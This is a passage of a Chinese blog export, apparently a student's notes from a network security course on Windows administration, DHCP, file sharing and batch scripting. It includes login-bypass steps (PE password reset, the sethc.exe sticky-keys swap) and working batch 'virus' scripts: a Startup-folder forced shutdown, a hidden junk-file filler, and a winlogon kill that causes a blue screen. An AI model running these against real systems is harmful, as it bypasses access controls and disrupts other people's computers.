给虚拟机配置真实路由地址(网关)，就可以实现虚拟机访问外网。再给虚拟机配置 DNS 服务器地址，就可以使用浏览器域名访问外网。 (3) 采用桥接模式下，虚拟机就相当于一台真实机，存在外部真实网络当中。一般用来提供 ftp，ssh,http等服务。 2. Net模式： (1) net模式下，虚拟机存在于内部的虚拟网络当中。虚拟机网卡 和 物理机网卡 不属于同一网络当中。因此，外部真实网络设备，无法访问虚拟网络内的虚拟机。但是，也不是所有外部网络都无法访问虚拟网络，&quot;宿主机除外&quot;。 (2) 但是，内部的虚拟机，却&quot;可以公网&quot;。它可以借助 NAT(网络地址转换) 功能，通过宿主机访问公网。 (3) 采用net模式下，虚拟机可以在虚拟内部网络通信，也可以访问外部真实网络。 默认采用的是虚拟交换机的DHCP服务配置IP信息，因此可以由于关机，和 IP租期，导致虚拟机IP不确定。 可以采用手动配置虚拟网络IP,该虚拟网络的虚拟子网，网关，子网掩码，地址池 IP 范围等信息可以在虚拟机 编辑 -&gt; 虚拟网络编辑器 -&gt; VMNet8交换机 中查看。3. Host-Only模式： (1) Host-Only模式下，虚拟机处于虚拟网络，并且虚拟网络是一个完全封闭的网络。 (2) 该模式下，虚拟机仅仅只能访问主机。就像是少了 Net 功能的 Net模式。 关于 win10 如何打开DHCP。直接 win+r -&gt; services.msc -&gt; 打开DHCP服务就行。 win10 有些服务默认是关闭且不显示的，比如 Telnet 远程服务。 需要在 控制面板 -&gt; 程序 -&gt; 启动或关闭windows程序 里面找到 Telnet 程序打开 还可以打开 win10 的IIS(Internet Information system)服务，包括FTP、web等功能。 交换机对外作用是将局域网地址表现成成一个公网地址，对内将路由器数据进行分发。 而路由器，就是连接外网的设备。 如果自己电脑网络出问题：拔网线，重启网络，release，renew，手动配置IP，DHCP自动获取IP，重启电脑。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"DHCP 部署与安全","date":"2020-07-31T10:30:30.000Z","path":"2020/07/31/2020.07.31 DHCP部署与安全/","text":"第十二章、DHCP部署与安全DHCP作用，概念，优点，原理(租约过程)1234567891011121314151617181920212223242526272829303132333435363738391. 作用： (1) Dynamic Host Configure Protocol：好理解一点就是动态域名配置协议！ (2) 自动分配 iP 地址。 2. 地址池/作用域： (1) 存放ip地址等信息的服务器。IP、子网掩码、网关、DNS、&quot;租期&quot;。3. DHCP优点： (1) 减少工作量(自动获取IP)、避免 iP 冲突、提高地址利用率(减少租期)。4. &quot;DHCP 原理&quot;: 也就是 DHCP 租约过程，分为 4 个步骤： (1) 客户端 发送 DHCP Discovery 广播包。 客户机广播请求 IP 地址（包含客户机的 MAC 物理地址）。 也就是说需要先找到动态域名配置服务器做出请求，并且告诉它，我的唯一标识。此时&quot;一台客户机可能会伪造多个mac地址&quot;。 (2) 服务器 响应 DHCP Offer 广播包。 服务器响应提供 IP 地址（但无子网掩码，网关，DNS域名解析等信息）。 此时可能&quot;不止一台服务器响应&quot;，也许有多台服务器为该物理地址提供 offer包。 先给你看看 IP ，如果觉得可行了，被接受了，再给你后续掩码和域名解析。 (3) 客户端 发送 DHCP Request 广播包。 此时，当客户端收到多份 offer包 时，进行选择IP。 做完选择后，我继续发送请求，请求子网掩码，网关等后续信息参数。 此时，未被选择的 dhcp服务器，可能有些不回话，有些回话。 (4) 服务器 发送 DHCP ACK 广播包 服务器确定了租约，并且提供网卡详细参数 IP、掩码、网关、DNS、&quot;租期&quot;等。5. &quot;DHCP&quot;续约原理； (5) 获得 ACK 包后，会有一个 iP 有效期（租期）。当租期过半 50% 后，客户机会继续向原来的 DHCP 服务器发送 Request 包。请求续约。 如果续约成功，之前的租期作废，新的租期从重新获得 ACK 包开始计时。 如果请求未得到响应，在租期过 87.5%。也就是只剩 1/8 的时间，再次发送 DHCP Request 包，进行请求续约。如果还没得到回应，那么该客户机将重新发送 DHCP Discovery 广播包，请求IP地址。 若无任何其他 DHCP服务器响应，客户机自动给自己分配一个 169.254.x.x/16 无效的ip地址。如果该局域网其他客户机也被自动分配了该网段的无效地址。还是可以 ping 通&quot;进行局域网通信&quot;。但是不能连接互联网。 &quot;注&quot;：关于租期的长短设置，如果是公共场所，人流量比较大的话，最好设置租期短一些，以免造成 iP 地址浪费。如果是企业公司里面，人员比较固定，可以把租期设长一些，减小 DHCP 服务器分配ip的压力。 (6) 当客户机不再需要 IP 地址时，便会通知服务器已&quot;释放了 IP 地址&quot;。此通知一般在&quot;改手动配置ip时发送&quot;，也可以&quot;手动发送&quot;（ipconfig /release）。 DHCP攻击与防御123456789101112131415161. 攻击 DHCP服务器： (1) 一些客户端系统，比如 Linux kali。可以伪造 MAC 物理地址。然后不断地向 DHCP 动态主机配置协议服务器 发动 DHCP discovery 广播包。以此来占用服务器地址池里面的地址。 (2) DHCP 服务器本身并没有这种防御和甄别机制，并且每完成一个租约，都会写一个租约列表。以此来记录那些ip地址是正在服役。这些租约未到期的ip地址是不能够再次提供给他人。所以，如果受到 DHCP 攻击，很容易造成服务器瘫痪。2. 仿造 DHCP服务器攻击客户机： (1) 当客户机发送 DHCP Discovery 广播包的时候，如果仿造的 DHCP 服务器响应的 Offer 广播包先被客户机接受到。那么后续就会给该客户机提供不合法的 IP 地址。 (2) 不和法的 IP 地址，有一个租约，租约未到期限的 50%，你不能重新获取 iP。3. DHCP服务器 防御： (1) 对于同一台计算机仿造物理地址，可以通过&quot;管理型交换机&quot;进行&quot;mac地址绑定&quot;。一般的普通傻瓜式交换机无此功能。 (2）客户机发送的 dhcp discovery 包需要通过交换机进行传输，然而如果交换机在中间进行拦截判断其中的mac地址，发现同一端口连接的客户机发送的mac地址有变化，就会拦截该广播包，并且做出警报！ (3) 这种交换机的该功能，实现的就是将 交换机端口 与 连接的客户机连接的Mac 地址进行一对一绑定。因为需要获取 DHCP Discovery包中的信息，所以该交换机需要能够&quot;识别 DHCP 协议&quot;。 4. 仿造DHCP 漏洞防御： (1) 同样利用 &quot;管理型交换机&quot;。监控所有交换机端口，只规定特定的端口发送 DHCP Offer 包，其他端口一律不允许发送 DHCP Offer包，这样一来仿造部署的DHCP 虚假响应就无法发送出去，在交换机端口阀门上被拦截。 相关经验 DHCP 协议的四次动作，只有前两次动作是比较危险的。第一阶段的客户机发送的discovery包，可能被大量伪造。第二阶段服务器回应的 offer 包也可能被伪造。后面两个阶段，客户机发送 request 请求包，以及 服务器回应的 ACK 包都是定向数据传输，所以很难伪造。 能不能人为伪造发送释放 IP 地址的信息给服务器，让正常服役的IP租约给不断作废了。 如果在学校内网，或者是校园内的局域网布置一台 DHCP 服务器，然后在 IP 配置里面 再把DNS指向自己搭建的 域名解析服务器。那岂不是尽在掌握之中。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"用pe系统破解开机密码","date":"2020-07-30T10:30:30.000Z","path":"2020/07/30/2020.07.30 PE系统启动破解开机密码/","text":"如何用 PE 系统破解开机密码步骤： 12345678910111213141. 下载一个 PE 系统制作工具。2. 制作一个 PE 系统镜像文件，用于虚拟机启动。 或则制作一个系统启动盘，把系统装进U盘，用于物理机使用。3. 插入启动U盘，或者光盘。重启计算机。4. 进入计算机固件系统，也就是 BIOS 系统。一般的牌子机，也就是个人笔记本电脑都有这玩意。一些专用服务器应该没有。5. 修改启动引导顺序。将 CDROM / USB 移动到最上面，或者直接 enter 进入相应应导。6. 进入 PE 系统后，一般里面会集成一些专业的应用软件。比如破解开机密码，磁盘分区助手，以及释放镜像。7. 运行破解开机密码，破解 SAM 文件，选中需要破解的用户名，然后输入新设置的密码。重启！成功！","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"文件共享服务器2","date":"2020-07-30T08:34:30.000Z","path":"2020/07/30/2020.07.30 共享文件服务器2/","text":"第九章、共享服务器2隐藏共享文件1234567891011121314151617181. 在共享文件的共享名后面加上美元符号&#x27;$&#x27;。 (1) 那么该共享文件在网络上不会被显示，但是却真实存在。 (2) 访问方式，只能通过地址栏输入准确的路径才能访问。eg: \\\\192.168.101.10\\share$2. 一些共享文件名称 (1) ipc$：虽然没有对于共享文件，但是是最危险的一个隐藏共享。通过这一个共享文件，可以访问你计算机的所有资源。 (2) C$：将 c 盘共享出去。3. 工作组： (1) 家在同一个工作组中，人人平等，你可以访问我，我也可以访问你。这种状态就叫做工作组。 (2) 些小型机构，教育行业。很多行业都是属于工作组状态。 (3) 查看方式：右击我的电脑属性，一般情况我们的计算机默认都是在 &quot;WORKGROUP&quot; 工作组当中。4. 域： (1) 与工作组环境相对应的是&quot;域环境&quot;，一般大型企业都是采用该环境管理。 (2) 该环境虽然绝大多数还是保持用户平等，但是一定存在一个用户，可以无条件的访问该域下所有计算机。 (3) 域管理员，拥有访问所有电脑的资源。 共享文件相关命令1234567891011121. net share (1) 显示共享出去的文件，及其相应的共享文件名。 (2) 微软默认将所有盘符，以及用户家目录设置为共享，或者隐藏共享。虽然可以方便远程管理，但是及其不安全。最好将其关闭！2. net share [共享名] /del (1) 删除该文件的共享。 (2) 该命令虽然可以删除 windowns 默认的一些共享，但是计算机重启后仍然会启动共享。 (3) 计算机默认的共享只能通过修改注册表，以及停止自动共享服务两者方式取消共享。3. net share [共享名]=&quot;文件路径&quot; (1) 打开文件共享。如果文件名后是$，那么该共享为隐藏。 修改注册表以关闭默认共享文件12345678910111. 什么是注册表 (1) 注册表相当于一个城市的户籍部门。专门登陆，注册，记录城市的所有入口信息。 (2) 计算机中，所有应用的作用，相关信息，那个文件是干什么用的，那个公司的。都需要到注册表中进行注册！！ (3) 注册表存在 C 盘，一旦丢失删除，其他盘上装载的软件运行会出现问题。 2. cmd -&gt; regedit 打开注册表编辑器。3. 修改注册表：打开以下路径，然后添加键值。 (1) HKEY_Local_MACHINE\\System\\CurrentControlSet\\Services\\LanmanServer\\Parameters\\ (2) 右键新建 REG_DWORD 类型的 AutoShareServer 键，值为 0 关闭 445 共享服务端口 cmd -&gt; services -&gt; 找到 server -&gt; 右击关闭。 这样就关闭了提高共享服务的 445 端口了。所有共享服务全都失效。 修改防火墙入站规则，禁止外来访问 445 端口，利用共享服务漏洞 打开防火墙 打开防火墙高级设置 选择入站规则 -&gt; 新建规则 -&gt; 选择端口号规则 -&gt; 选择 TCP 和 特定端口445 -&gt; 禁用 -&gt; 取名称。 选择入站规则 -&gt; 新建规则 -&gt; 选择端口号规则 -&gt; 选择 UDP 和 特定端口445 -&gt; 禁用 -&gt; 取名称。 相关经验 注意，我们在修改访问控制列表的时候，权限给予的是用户的身份证号，也就是一个 UID。而不是用户本身，因此，如果你将某用户删除，文件系统的访问控制列表中，会存在一个未识别的用户ID号。 fangning\\22157 ===========》 S-1-5-21-2112674742-10913682-775799340-1001 在启动文件夹，添加一条删除默认共享文件的命令。这样可以达到每次开机取消系统默认的共享文件。 一般 web服务器 不需要这些共享服务，所以需要关闭文件共享端口，关闭共享服务。 在路径搜索框输入 \\ \\192.168.101.10\\ADMIN$ ===========&gt; 进入 c:\\windows 目录 \\ \\192.168.101.10\\Users =============&gt; 进入用户家目录 \\ \\192.168.101.10\\C$ ===============&gt; 进入C盘 太可怕了，只要同在一个局域网，并且知道对方 IP 基本上就可以控制对方电脑。 为什么建议软件装在 C 盘？ 软件可以装在其他盘。但是该软件运行安装所产生的注册表是存放在C盘的。 一旦，你重装系统了。虽然说，其他盘的软件不会丢。但是，C盘与之相关的注册表丢失了。 这样就很可能会导致，其他盘的软件在重装完系统后，运行使用过程中会出现各种问题。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"文件共享服务器","date":"2020-07-29T11:30:30.000Z","path":"2020/07/29/2020.07.29 文件共享服务器/","text":"第十章、文件共享服务器共享服务器概述 CIFS (common internet file system通用的互联网文件系统)：一种文件共享协议protocol。 通过网络实现文件的共享、下载、上传。 该服务器内嵌在系统中，无需按照部署。 环境配置 两台笔记本需要通过 ping 通。构成一个局域网。 然后计算机1，可以新建一个文件夹，并且在属性栏里面将该文件打开共享。 然后在计算机2，通过网络目录，例如：” \\ \\ 192.168.101.10 \\ share”来访问计算机1 共享出的文件。 注意：123456789101112131415161718191. 文件右击 -&gt; 属性 -&gt; 共享 -&gt; 共享该文件 -&gt; 修改共享名 (1) 共享文件后，会在网络生成一个网络路径，其中路径中显示的文件夹名称是该文件的&quot;共享名&quot;。 2. 修改共享文件的访问控制列表： (1) 访问控制列表中的用户，或者组。可以通过局域网络访问该共享文件。 (2) 和 NTFS系统一样，也可以更改访问端用户的权限。只读，或者完全控制。3. 关于&#x27;访问控制权限&#x27;。 (1) 如果访问共享文件的用户是&quot;本地登陆&quot;, 也就是同一台PC, 同一个物理地址。那么&quot;他访问控制权限只受到文件系统权限限制&quot;。 (2) 如果访问共享文件的用户是&quot;远程登陆&quot;, 也就是在另外一台电脑上，远程通过网络访问该文件夹。那么&quot;他访问控制权限受到 共享权限 和 文件系统的访问控制列表 的双重性质，并且权限取交集&quot;。 (3) 也就是说，如果你要给一个用户配置共享文件的访问权限，不仅要关注共享访问控制列表，还要配置文件系统的访问控制列表。4. 一般我们将共享权限设置成 Everyone + 完全控制。 然后，再取消继承。 最后再到，文件系统权限列表设置你所需要给别人设置的权限。 &quot;这样两者取交集，最后还是你所需要设置的权限&quot;。6. 如果共享的文件包含许多子文件夹，并且需要设置不同的访问控制权。可以脱离父继承关系，然后单独给子文件夹设置权限。但是总文件夹一定要设置可以访问。 相关经验 对内一般用 CIFS 文件共享协议，对外一般用 FTP 协议。 需要同在一个局域网才能使用 CIFS 服务器进行文件共享！ 今天拿真人机做实验的时候发现，windowns的users文件夹居然默认是共享到局域网的！！！ 同样的，c:\\windows目录以及各大盘符居然都是默认共享。美其名曰远程管理，其实很容易泄露数据啊。再看看访问控制列表：（居然是Everyone，也就是说，只要同在一个局域网，别人就可以访问你的家目录！！） 解决办法：就算关了共享，还是会自动启动，所以最好就是共享就共享。都是把共享权限里面的everyone给删掉。这样，别人看到user，但是仍然访问不了。因为远程访问需要受共享权限限制！！ 重大发现：如果你有两台计算机都是windowns系统。如果你其中一台是用微软账户登陆的，那么在另外一台账户上，如果也用该微软账户登陆。 那么，两个系统的用户其实是同一个用户。彼此之间的远程控制，或者远程访问，不需要登陆账户密码。 难怪我好奇，为啥虚拟机的用户名，和我物理机的一模一样，而且虚拟机里面的用户我还不能改密码。原来都是同一个用户！22157（方宁）","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"ntfs安全权限","date":"2020-07-27T02:30:30.000Z","path":"2020/07/27/2020.07.27 ntfs安全权限/","text":"第九章 NTFS安全权限学习目的**为了能够针对不同的用户，给文件设置不同的访问权限！ ntfs文件系统概述 设置 NTFS 权限，实现不同用户的不同程度的访问。 复制文件被篡改和删除。 文件系统概述 存储文件的格式叫做文件系统： 常见有以下系统格式： windows: ​ FAT ​ NTFS ( new technology file system) Linux常见的： EXT 计算机的文件系统是一种存储和组织计算机数据的方法，它使得对其访问和查找变得容易。文件系统使用 文件和树形目录 的抽象逻辑概念，用户只需要关心每个文件所在的文件夹或路径，并不需要你知道数据存放在那个块里面。 NTFS特点 提高磁盘读写率。 可靠性，加密文件系统，访问控制列表（设置权限） 磁盘利用率，压缩，磁盘配额（为不同的用户，分配不同大小的使用空间）。 支持单个文件大于 4G。 修改 NTFS 访问控制列表 如果 NTFS 文件系统是一种抽象数据类型的话。那么，里面所提供的访问控制列表的所有权限就可以看出不同的方法。 这些方法，被封装在一个文件系统接口，或者说是类里面。 对于一个文件夹，以及其中的子文件夹。子文件夹的访问控制权限，默认是继承了父文件夹的访问控制权限。但是，这种继承关系，可以在高级中脱离，然后就可以修改自己的访问控制列表。 访问控制列表中，administrators 组成员拥有修改文件所属权的权限，该文件的所属权，默认是赋予给创建该文件的组 create owners。 是否拥有文件的控制权，决定了你是否拥有特殊权限，也就是修改访问控制列表的能力。 一般情况下，对一个文件夹进行安全权限操作。脱离父继承关系，删除除管理员以外的用户或组。 然后，再根据需要，添加相应的用户或者组。 对文件进行复制，或者剪切的时候。文件一旦进入另外一个路径，就会继承该路径的父文件夹的访问控制列表。 如果你需要对某一组开发一项权限，但是对改组内的其中一个用户不信任，不想让他获得该权限。那么无需将他踢出改组，只需要在访问控制列表中加入该用户，然后单独为他设置禁用权限。 12&quot;管理员拥有最高的权限，包括对所属任何用户文件的NTFS的访问控制表的修改&quot;即使你自己新建了一个文件夹，并且将访问控制列表中只保留自己拥有最高权限。但是&quot;你如果不是管理员，你将无法获得特殊权限，这就导致了，管理员可以修改你的文件的所属权！！&quot; 关于移动、复制、剪切操作后，文件访问控制列表的改变 首先： 同一磁盘下：移动 == 剪切 不同磁盘下：移动 == 复制 然后： 只有在同磁盘下，进行剪切，或者移动文件。该文件的访问控制列表不会改变。 最后： 跨磁盘的复制，移动，或者剪切操作，都会改变文件的访问控制列表，直接继承目标路径的父列表。 同一磁盘下，如果是复制的话，也会改变复制后文件的访问控制列表。 因此，在管理员向用户分发文件的时候，最好是用复制。 相关经验 针对每个用户，自己家目录里面的所有文件，是拥有完全控制权限的。 但是，对于家目录之外的文件，只有被赋予 ntfs 权限后，才能进行文件的读写。 若你只有一个文件夹的写入权限的话，你可以上传文件到该文件夹，但是不能删除，和修改。但是，对你自己上传过的文件，可以进行覆盖。 若你对某用户设置的权限与实际拥有的权限不一致时，检查该用户是否属于访问控制列表中另外的组中。这种情况可能会导致用户的权限叠加。 比如我想让 a 只读该文件，那么a用户就不能属于管理员组，因为管理员组拥有该文件的最高权限。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"服务器远程管理","date":"2020-07-26T10:30:30.000Z","path":"2020/07/26/2020.07.26 服务器远程管理/","text":"服务器远程管理远程控制方式 图形界面远程控制 telnet 命令行远程控制，通过telnet协议进行。 远程连接服务器操作(图形界面控制)1234567891011121. 先配置两台计算机的ip，属于同一网段，并且可以 ping 通。2. 配置服务端： 1) 打开远程连接服务。 2) 设置一个用于别人远程控制的用户，并且赋予一定的权限。为保证安全性，最好不要暴露服务器的管理员组，或者管理员用户。 3) 设置一个可以拥有远程登陆权限的账户。 管理员账户默认拥有远程桌面权限。 其他账户需要添加到：Remote Desktop Users组当中。3. 配置客户端： 1) 通过cmd-&gt;mstsc打开远程控制程序。 2) 通过ip地址链接服务器，通过用户密码登陆服务器。 远程连接服务器操作(Telnet 协议)1234567891011121. 先配置两台计算机的ip，属于同一网端，控制端可以 ping 通服务端。2. 配置服务端 1) 打开 Telnet 服务。 2) 添加一个用户，设置用户密码，给予制定权限。 2) 添加能够远程登陆服务器的用户到 TelnetClients 组。3. 配置客户端 1) cmd 打开命令行 2) telnet [目标服务器ip地址] 3) 输入用户名和密码控制。 4) 然后，你现在所在的命令行，就是你服务器所在的命令行！！ 命令1234567891. 命令 netstat /an 1) /a 显示所有连接和侦听端口。 2) /n 以数字显示地址和端口号。2. telnet 端口号 233. RDP(remote desktop protel远程桌面协议) 端口号 3389 系统密码破解仅适用于win7, xp等旧版windowns系统。亲测，win10已经修复。 1234567891011121. 在你不知道别人 win7 密码的时候。2. 利用篡改连续按五次 shift 键弹出的 sethc.exe 粘滞键程序，将其改成cmd.exe。然后就可以通过不登陆系统的情况下，调用命令行窗口，进行修改用户密码指令。3. 那么如何篡改该程序呢？通过另外一个&quot;启动修复漏洞&quot;。win7刚开机的时候，直接给电脑断电，然后再次开机，会出现一个启动错误修复弹窗，如未出现，多次重启断电重试。4. 通过点击启动修复程序，在系统修复失败的时候，查看问题详情，这时内容拉到最后，打开一个记事本超链接。5. 系统会打开一个文件。文件不重要，重要的是记事本编辑器，改编辑器有一个菜单栏-&gt;文件-&gt;打开。这时，你就可以看到它的系统内部文件。修改原sethc.exe程序名，然后，我们找到c:\\windowns\\system32\\cmd.exe复制，重命名为sethc.exe。6. 这时，就篡改成功了！！可以通过五次shift键，调用出cmd.exe。查找用户，修改用户密码为空。 相关经验 一般只要 ping 通，目标服务器打开远程控制端口。就可以进行远程控制。 重大发现。一般我们使用 win10 的话，自己本身所使用的用户并不是管理员用户。 而且，如果是家庭版的话，也没有用户和组的选项，控制面板更加不会显示administrator 但是，其实这个管理员用户是存在的，只是默认被禁用了。可以用 net user administrator /active:yes启动","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"用户与组管理","date":"2020-07-25T08:36:30.000Z","path":"2020/07/25/2020.07.25 用户与组管理/","text":"第六章 、用户与组管理1、用户用户概述： 每个用户登陆系统后，都会拥有一个不同的操作权限。 每个用户都有自己的一个 SID(安全标识符)。 用户 SID: S-1-5-21-2112674742-10913682-775799340-1001系统 SID: S-1-5-21-2112674742-10913682-775799340 用户 SID = 系统SID-用户的UID UID: 500 Administrator的 UID：500 普通用户的 UID：从1000开始。 Linux系统管理员root 的 UID：0 命令 whoami 显示用户名 whoami /user：显示用户 SID 账户密码存储位置：c:\\windows\\system32\\confi\\SAM #暴力破解，撞库www.cmd5.com windows 系统上，默认密码有效期最长 42 天，6周。 内置账户： 给人使用账户： administrator (管理员账户) guest (来宾账户，比如学校里面的电脑) 计算机服务组件相关的系统账号 system (系统账户 == 至高无上) local services (本低服务账户 == 权限等于普通用户) network services (网络服务账户 == 权限等于普通用户 ) 配置文件 每个用户在第一次登陆的时候，会产生一个 userprofile 路径。例如： c:\\用户 c:\\documents and settings 用户管理命令123456789101112131415161718191. net user 1) 列出当前用户列表2. net user [用户名] 1) 查看该用户详细信息。3. net user [用户名] 新密码。 1) 给该用户修改密码。4. net user [新用户名] [用户密码] /add 1) 新建用户。5. net user [用户名] /del 1) 删除用户 6. net user [用户名] /active :[yes/no] 1) 激活 或 禁用 该用户。## 增， 删， 查， 改， 禁 2、组管理组概述 简化权限赋予。 赋权限方式： 用户-&gt;组-&gt;赋权限 用户-&gt;赋权限 内置组系统有些自带的组，已经被系统默认赋予了一定的权限，用于管理不同的功能。 1234561. administrators # 管理员组2. users # 普通用户组3. network congiguration operators # 网络配置组4. print operators # 打印机组5. remote Desktop # 远程桌面组6. guests # 来宾组 组管理命令123456789101112131415161. nat localgroup # 查看所有本地分组。2. nat localgroup [组名] # 查看制定小组成员3. nat localgroup [组名] [用户名] /add # 添加用户到组，成为成员4. net localgroup [组名] [成员名] /del # 删除该组中的制定成员 5. net localgroup [新建组名] /add ## 添加新的小组 ## 新建的组暂时没有任何权限，需要人工添加权限 相关经验 windows 服务器：win2000、win2003、win2008。 linux 服务器：Redhat(开源付费)、Centos(开源免费) 系统内置的系统账户之所以要分三个，系统账户、本地服务账户、网络服务账户。 是因为，一旦某个服务所允许的进程被攻击后，只会失去管理该服务那个账户权限，不会得到其他账户的权限。 组的概念是为了简化权限赋予。 公司很多人，很多部门。他们需要的权限不一，所以需要给一群所需权限一致的人集中放到一个组当中。 然后，只需要给改组赋予权限就足够。 win10中并不存在管理员用户。只有管理员组。平时我们用的账号，22157 存在于管理员组和普通用户组中。 注意：system权限 &gt; 管理员权限 &gt; 管理员组员权限","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"bat批处理文件","date":"2020-07-17T09:08:00.000Z","path":"2020/07/17/2020.07.17 批处理/","text":"批处理1123456789101112131415161718191. 新建 .bat 文件写批处理命令&gt; 在 bat 文件中编写批处理命令。双击运行2. 命令 pause&gt; 暂停，输出“按任意键继续...”，脚本停止，知道获取输入。3. 命令 @echo off&gt; 关闭回显。&gt; 脚本在 dos 窗口运行过程中，所键入的 dos 命令被隐藏起来。只显示运行过程中的输出结果。4. 命令 color 0A&gt; 改变字体颜色，前者为背景色，后者为字体颜色。&gt; 具体 可使用 help color 查看其他颜色。5. 定义变量，&#x27;=&#x27; 号左右不能加&quot;空格&quot;!&gt; set a=100 #定义时复制&gt; set /p b=请输入一个数 #定义后，用户输入值&gt;&gt; 使用变量时，用 echo %a%, %b% #用百分号引起来 制作恶意脚本，并且放置到开机启动文件夹中123456789将关机脚本比编好，然后放到开机自动启动的程序文件夹中。这样一旦启动计算机，就会运行一遍该脚本使得计算机关机！@echomove 关机.bat &quot;C:\\Users\\22157\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\关机.bat&quot;shutdown /p # 直接强制关机# 也可以使用 shutdown /s /f /t 0# 0 秒后强制关机。 批处理212345678910111213141516171819202122231. 冒号 &#x27;:&#x27; 和 &quot;goto&quot; 命令。 1) :d ：表示接下来的批处理指令属于块&#x27;d&#x27;范围。 2) 代码块名称只能是 &quot;英文&quot;。 2) goto d：批处理允许到此处直接跳转到模块d,然后继续往下运行。eg: :part_1 start :part_2 goto part_1 注：以上批处理命令为死循环！！ 2. 命令 start 1) 单独一个 start 表示打开 cmd.exe 2) start [域名 / 程序名] 表示打开该网页或者程序。 3. 变量 userprofile 1) 表示一个变量，使用时需要用%userprofile%引起来。 2) 改变量的值表示相应电脑中的用户路径：如 set userprofile=&quot;c:\\Users\\22157&quot;。 3) 因此每台win10电脑的启动程序路径都可以用以下表示： &quot;%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&quot; 4. 命令 title [字符串] 1) 修改命令窗口名称。 变量 和 if语句：12345678910111213141516171819202122232425261. 设置变量： 1) 变量声明和初始化： set time=100 2) 变量声明和用户输入： set /p time=用户输入提示语 3) 变量的使用 eg： shutdown /s /f /t %time%2. if 语句： 1) if &quot;条件一&quot;==&quot;条件二&quot; goto menue 2) 条件中可以是变量的引用 %time%， 可以是数值 100 3) 3. timeout 命令： 1) 按任意键结束延时 timeout /t 60 1&gt;nul 2&gt;nul 2) 按ctrl+c结束延时 timeout /t 60 /nobreak 3) 或者通过 ping /n来实现间接延时： ping /n 60 127.0.0.1 1&gt;nul 2&gt;nul4. taskkill 命令： 1) 杀掉制定进程：taskkill /im [进程名] taskkill /im exploreer.exe #桌面进程5. ntsd -c q -pn winlogon.exe 1) 杀掉windowns登陆进程，该命令只适用于xp 2003。 2) 该进程不能被 taskkill 杀掉。 相关经验 开机启动程序文件夹 win 10: C:\\Users\\22157\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 或 %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup win xp - 2003: %userprofile%\\「开始」菜单\\程序\\启动 如果把脚本往这里面一放，那么这个电脑每次开机都会运行该程序。 但是，一般的杀毒软件都会检测这个地方的文件修改，所以程序一般放不进去！ 不知道为什么在脚本里面用 echo 指令， 在运行时输出中文时会乱码！ 注意在路径名称含有空格时，路径需要用英文双引号引起来。 发现一个奇怪的东西。我们运行 bat 文件的时候，系统会直接调用 cmd.exe。 如果bat命令中用到了一些系统软件指令，比如 shutdown , logoff(注销) 的话系统会直接调用 shutdown.exe 和 logoff.exe。 两种应用程序区别是，cmd.exe可以多进程调用，实现多开。而shutdown.exe 和 logoff.exe 只要有一个在运行，再次调用就无效。 我发现了一个问题，就是，如果我把 bat 文件名称改成系统软件的名称，如 shutdown.bat ，然后我再在里面使用 shutdown /s /f /t /50 的命令，当cmd.ext 运行到该指令的时候，它会去找可执行的 shutdown 程序，然后最近的又是 shutdown.bat 自己。这就会形成一个无限递归调用自身！！ 相关病毒关机病毒（修改启动程序文件，会被安全管家检测到！）12345@echo offset a=&quot;%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&quot;echo @echo off &gt; %a%\\GuanJi.batecho shutdown /s /f /t 60 &gt;&gt; %a%\\GuanJi.batshutdown /s /f /t 60 解除关机123456@echo offshutdown /aset a=&quot;%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&quot;cd %a%del GuanJi.bat /q 1&gt;nul 2&gt;nul 制造大垃圾文件（win10 如果要在 C 盘下创建，需要管理员权限允许 .bat 脚本）123@echo offfsutil file createnew d:\\system.ini 2147483640 1&gt;nul 2&gt;nulattrib +s +h +r +a d:\\system.ini 1&gt;nul 2&gt;nul 删除垃圾123@echo offattrib -s -h -r -a d:\\system.ini 1&gt;nul 2&gt;nuldel d:\\system.ini 1&gt;nul 2&gt;nul win xp 2003蓝屏1ntsd -c q -pn winlogon.exe ## 杀windowns 登录进程，由于你已经登陆，所以该进程杀不死，所以只能蓝屏","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"DOS命令","date":"2020-07-16T05:08:00.000Z","path":"2020/07/16/2020.07.16 dos命令2/","text":"Dos 基础命令2 命令 fsutil fsinfo drives 查看磁盘驱动列表。 命令 echo [字符串] 